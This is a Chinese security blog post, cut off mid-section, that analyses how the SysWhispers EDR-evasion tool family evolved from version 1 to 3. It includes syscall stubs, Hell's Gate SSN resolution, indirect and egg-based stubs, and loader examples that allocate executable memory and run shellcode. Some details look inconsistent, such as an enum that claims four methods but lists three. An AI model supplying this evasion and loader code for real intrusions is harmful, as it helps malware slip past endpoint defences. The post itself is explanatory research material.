---
title: edr绕过工具 SysWhispers4 源码分析系列(九)
url: https://mp.weixin.qq.com/s/el0SXNUXAW3Y8xQYnL8rRg
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:33:20.287119
---

# edr绕过工具 SysWhispers4 源码分析系列(九)

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnskUCsDSwDVkSepZvROAOjq5vbianJC2Q0ibpcPJ7PkjjMNiaibwMoYC61Q1EV3ia4MbibpU4Efwr2L3yYCUfw7kVH3FCeib7dB5iak6H4/0?wx_fmt=jpeg)

# edr绕过工具 SysWhispers4 源码分析系列(九)

原创

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器中沉浸阅读

# ![SysWhispers：如何通过直接系统调用实现AVEDR绕过-腾讯云开发者社区-腾讯云](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnulB7zsXfOVrPU4myQNhUTL4giajbpicO4YewR5PEM5ladBSWeubnLTl85x6kQk2JIyMnXmRd9M2sNLpMtbN930cQZqO2lWQNMxw/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

# 官网：http://securitytech.cc

#

# 九、SysWhispers 各版本演进与对比分析

本文档深入分析 SysWhispers 系列工具从 v1 到 v4 的技术演进历程，详细对比各版本的架构设计、核心特性、优缺点以及适用场景。通过本文档，你将理解每一代产品的技术突破和历史贡献。

## 1. SysWhispers1 - 开创者

### 1.1 历史背景

**发布时间**：2019 年
**作者**：Kyle Kwong (trustedsec)
**GitHub**: https://github.com/trustedsec/SysWhispers
**历史地位**：首个开源的 direct syscall 框架

**时代背景：**

```
1. 2019年安全形势：
2. ├─ EDR 产品开始普及（CrowdStrike,CarbonBlack等）
3. ├─传统 API Hook成为主流检测手段
4. ├─红队需要新的绕过技术
5. └─DirectSyscall概念刚刚兴起
```

### 1.2 核心原理

**基本思想：**

```
1. 传统调用链：
2. 应用程序→ kernel32.dll → ntdll.dll → syscall →内核

4. DirectSyscall调用链：
5. 应用程序→自定义 stub → syscall →内核
6. ↑
7. 绕过 kernel32 和 ntdll 的Hook
```

**技术实现：**

```
1. # SysWhispers1 生成器（简化版）
2. def generate_syscall_stub(function_name, ssn):
3. """
4. 生成 x64 syscall stub
5. """
6. return f"""
7. {function_name} PROC
8. mov r10, rcx
9. mov eax, {ssn}h
10. syscall
11. ret
12. {function_name} ENDP
13. """
```

**生成的汇编代码：**

```
1. ;NtAllocateVirtualMemory-SysWhispers1生成
2. NtAllocateVirtualMemory PROC
3. mov r10, rcx
4. mov eax,18h
5. syscall
6. ret
7. NtAllocateVirtualMemory ENDP
```

### 1.3 主要功能

**支持的特性：**

| 功能 | 支持情况 | 说明 |
| --- | --- | --- |
| 架构支持 | ⚠️ x64 only | 仅支持 64 位系统 |
| 编译器 | ✅ MSVC, MinGW | 支持两大编译器 |
| SSN 解析 | ❌ 静态表 | 硬编码 SSN 值 |
| 调用方式 | ✅ Embedded only | 仅直接 syscall |
| 混淆功能 | ❌ 无 | 无混淆能力 |
| 规避技术 | ❌ 无 | 无 ETW/AMSI bypass |
| 函数数量 | ~50 个 | 基础 NT 函数 |

**使用方法：**

```
1. # SysWhispers1 使用示例
2. python syswhispers.py \
3. --functionNtAllocateVirtualMemory \
4. --functionNtCreateThreadEx \
5. --functionNtWriteVirtualMemory \
6. --output-dir ./output
```

### 1.4 优点与局限

**✅ 优点：**

1. **开创性**：首个将 direct syscall 工具化的项目
2. **简洁性**：代码简单，易于理解和修改
3. **有效性**：成功绕过当时的 EDR 检测
4. **开源免费**：推动安全技术民主化

**❌ 局限性：**

1. **SSN 固定**：使用静态 SSN 表，无法适应不同 Windows 版本

   ```

   ```

1. `# SysWhispers1 的 SSN 定义（硬编码）`
2. `NT_OPEN_PROCESS =0x3A# 仅适用于特定版本`

2. **功能单一**：只有基本的 syscall stub 生成

   ```

   ```

1. `缺少功能：`
2. `├─动态 SSN 解析`
3. `├─间接调用`
4. `├─代码混淆`
5. `└─辅助功能（ETW bypass 等）`

3. **架构限制**：仅支持 x64，不支持 x86/ARM64
4. **维护停止**：2019 年后未再更新

### 1.5 历史意义

**技术贡献：**

```
1. SysWhispers1的影响：
2. ├─普及了DirectSyscall概念
3. ├─启发了后续工具开发（SysWhispers2/3/4）
4. ├─推动了 EDR 绕过技术发展
5. └─促进了用户态监控技术升级
```

**代码示例（经典用法）：**

```
1. // SysWhispers1 典型使用
2. #include"syscalls.h"

4. int main(){
5. // 直接使用生成的函数，无需初始化
6. NtAllocateVirtualMemory(
7. GetCurrentProcess(),
8. &base,
9. 0,
10. &size,
11. MEM_COMMIT,
12. PAGE_EXECUTE_READWRITE
13. );

15. // 执行 shellcode
16. ((void(*)())base)();

18. return0;
19. }
```

---

## 2. SysWhispers2 - 重大改进

### 2.1 发布背景

**发布时间**：2020 年
**作者**：trickster0 (TheWover)
**GitHub**: https://github.com/trickster0/SysWhispers2
**改进重点**：解决 SSN 版本兼容性问题

**核心创新**：引入 Hell's Gate 技术

### 2.2 Hell's Gate 技术

**基本原理：**

```
1. Hell's Gate 算法流程：
2. 1. 获取 ntdll.dll 基址
3. 2. 定位目标函数（如 NtAllocateVirtualMemory）
4. 3. 读取函数前几个字节
5. 4. 提取 SSN 指令中的立即数
6. 5. 运行时动态确定 SSN
```

**实现代码：**

```
1. // SysWhispers2 Hell's Gate 实现
2. DWORD HellsGate(DWORD dwHash){
3. // 1. 获取 ntdll 导出表
4. PIMAGE_EXPORT_DIRECTORY pExportDir =GetExportDirectory(ntdllBase);

6. // 2. 查找目标函数
7. for(DWORD i =0; i < pExportDir->NumberOfNames; i++){
8. char* funcName =(char*)(ntdllBase + pExportDir->AddressOfNames[i]);

10. if(Hash(funcName)== dwHash){
11. // 3. 获取函数地址
12. DWORD funcOrdinal = pExportDir->AddressOfNameOrdinals[i];
13. BYTE* pFunction =(BYTE*)(ntdllBase + pExportDir->AddressOfFunctions[funcOrdinal]);

15. // 4. 检查是否是标准 syscall stub
16. if(pFunction[0]==0x4C&& pFunction[1]==0x8B&& pFunction[2]==0xD1){
17. // 5. 提取 SSN (mov eax, XX 中的 XX)
18. if(pFunction[4]==0xB8){
19. DWORD ssn =*(DWORD*)(pFunction +5);
20. return ssn;
21. }
22. }
23. }
24. }

26. return INVALID_SSN;
27. }
```

**生成的 C 代码：**

```
1. // SysWhispers2 生成的代码框架
2. EXTERN_C NTSTATUS NTAPI SW2_NtAllocateVirtualMemory(
3. HANDLE ProcessHandle,
4. PVOID*BaseAddress,
5. ULONG_PTR ZeroBits,
6. PSIZE_T RegionSize,
7. ULONG AllocationType,
8. ULONG Protect
9. ){
10. // 动态获取 SSN
11. DWORD dwSSN =HellsGate(HASH_NtAllocateVirtualMemory);

13. // 设置参数
14. SYSCALL_INTERNAL_ARGUMENTS InternalArgs={0};
15. InternalArgs.Argument1=ProcessHandle;
16. InternalArgs.Argument2=BaseAddress;
17. // ...

19. // 执行 syscall
20. returnLocalDispatch(dwSSN,&InternalArgs);
21. }
```

### 2.3 新增功能

**功能对比表：**

| 功能 | SysWhispers1 | SysWhispers2 | 改进说明 |
| --- | --- | --- | --- |
| SSN 解析 | 静态表 | Hell's Gate | ✅ 动态解析 |
| 哈希算法 | 无 | DJB2 | ✅ 运行时查找 |
| 代码结构 | 纯汇编 | C+ASM 混合 | ✅ 更易维护 |
| 初始化 | 不需要 | 需要 SW2\_Initialize | ⚠️ 增加步骤 |
| 架构支持 | x64 only | x64 only | ❌ 无改进 |
| 函数数量 | ~50 | ~80 | ✅ 增加 60% |

**新增函数示例：**

```
1. // SysWhispers2 新增的函数
2. SW2_NtQueryInformationProcess    // 进程信息查询
3. SW2_NtSetInformationProcess      // 进程信息设置
4. SW2_NtQuerySystemInformation     // 系统信息查询
5. SW2_NtAdjustPrivilegesToken      // Token 权限调整
6. SW2_NtOpenProcessToken           // 打开进程 Token
```

### 2.4 使用方法

**典型流程：**

```
1. #include"SysWhispers2.h"

3. int main(){
4. // 必须初始化（用于 Hell's Gate 扫描）
5. if(!SW2_Initialize()){
6. printf("Initialization failed\n");
7. return1;
8. }

10. // 使用 syscall
11. NTSTATUS status = SW2_NtAllocateVirtualMemory(
12. GetCurrentProcess(),
13. &base,
14. 0,
15. &size,
16. MEM_COMMIT,
17. PAGE_EXECUTE_READWRITE
18. );

20. if(NT_SUCCESS(status)){
21. ((void(*)())base)();
22. }

24. return0;
25. }
```

### 2.5 优点与不足

**✅ 优点：**

1. **动态 SSN**：解决了版本兼容性问题

   ```

   ```

1. `支持的Windows版本：`
2. `├─Windows7 SP1`
3. `├─Windows8.1`
4. `├─Windows10(所有版本)`
5. `└─WindowsServer2012-2019`

2. **Hell's Gate**：快速且相对可靠

   ```

   ```

1. `性能对比：`
2. `├─静态表：~0 cycles (最快)`
3. `├─Hell's Gate: ~1000 cycles (快)`
4. `└─ 其他动态方法：~5000+ cycles (慢)`

3. **代码组织更好**：C+ASM 分离，易于维护

**❌ 不足之处：**

1. **怕 Hook**：如果 ntdll stub 被 Hook，Hell's Gate 失效

   ```

   ```

1. `// 被 Hook 的 stub`
2. `` 00007FF8`12345678 E9A1B2C3D4    jmp     edr_detour ``
3. `` 00007FF8`1234567D0000          add     [rax], al  ;原始字节被破坏 ``
5. `// Hell's Gate 无法读取正确的 SSN`

2. **仍然只支持 x64**：无法用于 32 位程序
3. **缺乏混淆**：生成的代码特征明显
4. **单次扫描**：只在初始化时扫描一次

---

## 3. SysWhispers3 - 全面扩展

### 3.1 发布信息

**发布时间**：2022 年
**作者**：trickster0
**GitHub**: https://github.com/trickster0/SysWhispers3
**重大突破**：多架构支持 + 多种调用方式

### 3.2 核心新特性

#### 特性 1：多架构支持

**支持的架构：**

```
1. SysWhispers3架构支持：
2. ├─ x64 (AMD64)←完整支持
3. ├─ x86 (i386)←新增
4. ├─WoW64←新增（32位在64位系统）
5. └─ ARM64                ←实验性支持
```

**x86 实现（使用 sysenter）：**

```
1. ;SysWhispers3 x86 stub
2. _NtAllocateVirtualMemory@24 PROC
3. mov eax,46h; SSN
4. mov edx,7FFE0300h; SYSENTER_RETURN_ADDRESS
5. sysenter             ;进入内核
6. ;注意：sysenter 不自动返回
7. _NtAllocateVirtualMemory@24 ENDP
```

**WoW64 Heaven's Gate：**

```
1. ;WoW64调用流程
2. push fs:[0xC0];保存 WOW32Reserved
3. mov eax,46h; SSN
4. call dword ptr fs:[0xC0];通过Heaven's Gate 进入 x64 层
```

#### 特性 2：多种调用方式

**4 种调用方式：**

```
1. # SysWhispers3 调用方式枚举
2. classInvocationMethod(Enum):
3. EMBEDDED ="embedded"# 直接 syscall
4. INDIRECT ="indirect"# 跳转到 ntdll gadget
5. EGGS ="eggs"# egg marker 技术
```

**Indirect 方式实现：**

```
1. ;SysWhispers3Indirect调用
2. EXTERN syscall_gadget:QWORD

4. SW3_NtAllocateVirtualMemory PROC
5. mov r10, rcx
6. mov eax,18h
7. jmp qword ptr [syscall_gadget];间接跳转
8. ; RIP 显示在 ntdll.dll
9. SW3_NtAllocateVirtualMemory ENDP
```

**Egg 方式实现：**

```
1. ;SysWhispers3Egg调用
2. SW3_NtAllocateVirtualMemory PROC
3. mov r10, rcx
4. ;Egg marker (8字节占位符)
5. DB 41h,42h,43h,44h,45h,46h,47h,48h
6. ret
7. SW3_NtAllocateVirtualMemory ENDP

9. ;运行时由HatchEggs()替换为 syscall 指令
```

#### 特性 3：Halo's Gate 增...